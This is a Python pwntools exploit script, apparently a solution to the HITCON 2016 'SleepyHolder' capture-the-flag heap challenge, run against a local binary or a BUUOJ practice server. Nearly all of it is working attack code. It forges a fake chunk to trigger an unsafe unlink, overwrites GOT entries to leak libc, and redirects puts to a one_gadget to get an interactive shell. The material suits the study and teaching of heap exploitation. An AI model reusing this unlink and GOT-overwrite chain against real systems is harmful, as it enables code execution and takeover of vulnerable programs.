# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'sleepyHolder_hitcon_2016'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25963)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def keep(choice, content):
    p.sendlineafter("3. Renew secret\n", '1')
    p.sendlineafter("Big secret\n", str(choice))
    p.sendafter("Tell me your secret: \n", content)

def wipe(choice):
    p.sendlineafter("3. Renew secret\n", '2')
    p.sendlineafter("2. Big secret\n", str(choice))
    if choice == 1:
        log.success('small chunk is wipped')
    if choice == 2:
        log.success('big chunk is wipped') 

def renew(choice, content):
    p.sendlineafter("3. Renew secret\n", '3')
    p.sendlineafter("2. Big secret\n", str(choice))
    p.sendafter('Tell me your secret: \n', content)

small_chunk_ptr = 0x00000000006020D0
big_chunk_ptr = 0x00000000006020C0

def unlink():
    keep(1, "aaaa")                 # small secret
    # debug(0)
    keep(2, "bbbb")                 # big secret
    # debug(0)
    wipe(1)                         # free small secret => free into fastbins
    # debug(0)
    keep(3, "cccc")                 # huge secret => move into small bins
    # debug(0)
    wipe(1)
    # debug(0)

    payload  = p64(0)                       # prev_size
    payload += p64(0x21)                    # size
    payload += p64(small_chunk_ptr - 0x18)  # fake fd
    payload += p64(small_chunk_ptr - 0x10)  # fake bk
    payload += p64(0x20)                    # fake prev_size of next
    # size of next has been set (size of big secret)
    keep(1, payload)
    # debug(0)
    wipe(2)                                 # trigger unlink
    # debug(0)

def leak():
    global one_gadget

    payload  = 'a' * 0x8
    payload += p64(elf.got['free'])             # *big_chunk_ptr = free@got.plt
    payload += 'b' * 0x8
    payload += p64(big_chunk_ptr)               # *small_chunk_ptr = big_chunk_ptr
    payload += p32(1)                           # *isBig_full = 1, 先前wipe(2)trigger unlink时被设置为0
    renew(1, payload)
    # debug(0)
    renew(2, p64(elf.plt['puts']))              # *free@got.plt = puts@plt
    # debug(0)
    renew(1, p64(elf.got['puts']))              # *big_chunk_ptr = puts@got.plt
    # debug(0)

    wipe(2)                                     # puts(puts@got.plt)
    # debug(0)

    puts_addr = u64(p.recvline()[:6] + "\x00\x00")
    libc_base = puts_addr - libc.sym['puts']
    one_gadget = libc_base + 0x45226
    log.success('puts_addr => ' + hex(puts_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('one_gadget => ' + hex(one_gadget))

def pwn():
    payload  = 'c' * 0x10
    payload += p64(elf.got['puts'])             # *small_chunk_ptr = puts@got.plt
    renew(1, payload)
    # debug(0)
    renew(1, p64(one_gadget))                   # *puts@got.plt = one_gadget
    # debug(0)
    p.interactive()

if __name__ == '__main__':
    unlink()
    leak()
    pwn()